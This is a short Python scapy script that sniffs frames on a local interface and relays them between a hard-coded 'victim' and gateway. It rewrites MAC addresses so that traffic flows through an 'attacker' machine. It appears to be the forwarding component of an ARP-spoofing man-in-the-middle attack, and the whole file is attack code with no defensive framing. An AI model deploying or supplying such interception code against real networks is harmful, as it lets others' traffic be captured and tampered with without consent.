from scapy.all import *

# IP addresses
victim_ip = "192.168.1.18"
gateway_ip = "192.168.1.1"
attacker_ip = "192.168.1.19"

# MAC addresses
gateway_mac = "00:0c:29:62:1b:1f"
attacker_mac = "00:0c:29:2d:6f:18"
victim_mac = "00:0c:29:f2:0a:8b"

# Define packet forwarding function
def forward_packet(pkt):
    # Check if the packet has an IP layer
        # Check if the packet came from the IP we're sniffing from
    if  pkt[Ether].src == victim_mac:
        # Change the destination MAC to the one we're forwarding to            
            pkt[Ether].dst = gateway_mac
            pkt[Ether].src = attacker_mac
        # Send the packet to the new destination
            sendp(pkt)
        
    if  pkt[Ether].src == gateway_mac and pkt[Ether].dst == attacker_mac:
        # Change the destination MAC to the one we're forwarding to            
            pkt[Ether].dst = victim_mac
            pkt[Ether].src = attacker_mac
            sendp(pkt)

# Start sniffing packets
while (1):
    try:
        sniff(iface = "eth0", prn=forward_packet)

    except:
        continue